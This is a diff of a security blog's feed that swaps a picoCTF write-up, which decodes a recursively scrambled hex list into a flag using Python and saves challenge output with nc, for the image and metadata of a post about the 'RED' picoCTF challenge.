-<h2 id="how-to-decode-it">How to decode it?</h2>
-
-<h3 id="step-1-read-the-scrambled-output-a-python-list-from-a-file">Step 1: Read the scrambled output (a Python list) from a file:</h3>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-import ast
-
-with open('scrambled_output.txt') as f:
-    scrambled_data = f.read()
-
-data = ast.literal_eval(scrambled_data)
-</code></pre>
-</div>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">ast.literal_eval</code> safely evaluates the string to a nested Python list.</li>
-</ul>
-
-<h3 id="step-2-decode-hex-strings-to-ascii-but-skip-nested-references">Step 2: Decode hex strings to ASCII but <strong>skip nested references</strong></h3>
-
-<p>You want to:</p>
-
-<ul>
-  <li>
-    <p>Decode only <strong>direct hex string elements</strong> on the top level of each list.</p>
-  </li>
-  <li>
-    <p><strong>Ignore nested lists inside each list</strong> because those are recursive references to previous parts they’ll cause duplicates.</p>
-  </li>
-</ul>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-def decode_node(node, visited=None):
-    if visited is None:
-        visited = set()
-
-    if isinstance(node, list):
-        node_id = id(node)
-        if node_id in visited:
-            return ''
-        visited.add(node_id)
-
-        result = ''
-        for el in node:
-            if isinstance(el, list):
-                continue  # skip nested refs
-            elif isinstance(el, str) and el.startswith('0x'):
-                result += chr(int(el, 16))
-        return result
-
-    elif isinstance(node, str) and node.startswith('0x'):
-        return chr(int(node, 16))
-
-    return ''
-</code></pre>
-</div>
-
-<h3 id="step-3-rebuild-the-flag-linearly-by-decoding-each-top-level-element">Step 3: Rebuild the flag linearly by decoding each top-level element:</h3>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-flag = ""
-for item in data:
-    flag += decode_node(item)
-
-print(flag)
-</code></pre>
-</div>
-
-<p>Full code:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-import ast
-
-def decode_node(node, visited=None):
-    if visited is None:
-        visited = set()
-
-    # If this node is a list
-    if isinstance(node, list):
-        # To avoid cycles or repeat processing the same slice multiple times,
-        # we use id() of the node list object to track visits.
-        node_id = id(node)
-        if node_id in visited:
-            return ''  # already decoded, skip to avoid duplicates or infinite loops
-        visited.add(node_id)
-
-        # Decode each element in list sequentially
-        result = ''
-        for el in node:
-            # If el is a list inside the node, it usually is a recursive reference slice,
-            # so skip it to avoid duplication.
-            if isinstance(el, list):
-                continue
-            # If string with hex prefix, decode to char
-            elif isinstance(el, str) and el.startswith('0x'):
-                result += chr(int(el, 16))
-        return result
-
-    # If node is a string hex
-    elif isinstance(node, str) and node.startswith('0x'):
-        return chr(int(node, 16))
-
-    # Otherwise, ignore
-    return ''
-
-# Read scrambled data from file
-with open('scrambled_output.txt') as f:
-    scrambled_data = f.read()
-
-data = ast.literal_eval(scrambled_data)
-
-flag = ""
-for item in data:
-    flag += decode_node(item)
-
-print(flag)
-</code></pre>
-</div>
-
-<p>Remember to save the output like this: <code class="language-plaintext highlighter-rouge">nc verbal-sleep[.]picoctf[.]net 63518 &gt; scrambled_output.txt</code></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><category term="Reverse Engineering" /><summary type="html"><![CDATA[Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/637/928/desktop-wallpaper-the-grim-reaper-%C2%B7%E2%91%A0-grim-reaper-layouts-backgrounds.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/637/928/desktop-wallpaper-the-grim-reaper-%C2%B7%E2%91%A0-grim-reaper-layouts-backgrounds.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*24UtVzAOhW9l80TZJ0ioZQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[Challenge: RED (PicoCTF) Description: RED, RED, RED, RED Download: red.png]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/346/328/desktop-wallpaper-grim-reaper-backgrounds-grim-reaper.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/346/328/desktop-wallpaper-grim-reaper-backgrounds-grim-reaper.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
